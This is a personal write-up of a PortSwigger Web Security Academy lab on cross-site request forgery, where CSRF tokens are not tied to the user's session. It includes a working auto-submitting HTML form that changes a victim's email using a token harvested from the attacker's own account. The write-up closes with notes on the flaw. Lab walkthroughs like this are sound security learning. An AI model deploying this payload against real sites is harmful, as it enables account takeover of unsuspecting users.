# PortSwigger Lab: CSRF where token is not tied to user session

##  How I Solved It

1. **Intercepted Victim's Request:** Captured the `POST /my-account/change-email` request for User A (`wiener`).
2. **Harvested Attacker's Token:** Logged into User B (`carlos`) in an incognito window and grabbed a fresh, unused `csrf` token.
3. **Validated the Flaw:** Swapped User A's token with User B's token in Burp Repeater. The server accepted it and processed the email change successfully.
4. **Crafted & Delivered PoC:** Generated a hidden HTML form embedding a brand new, unused token from User B's session and delivered it to the victim:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://0a9900fc03e5edb5800fc169009f00e2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker4@exploit.com" />
      <input type="hidden" name="csrf" value="jTyfOgVwoWPoCqmnCjkHkam984zsuEuW"/>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

##  What I Learned
* **Session Binding Flaws:** Web applications must securely map an anti-CSRF token directly to the specific user's session. If the application only validates if a token is globally "valid" without checking *whose* session owns it, the defense fails.
* **Bypass Strategy:** An attacker can log into their own account, harvest a valid CSRF token, and embed it into a malicious exploit aimed at a victim. The server accepts the request because the token itself is legitimate.
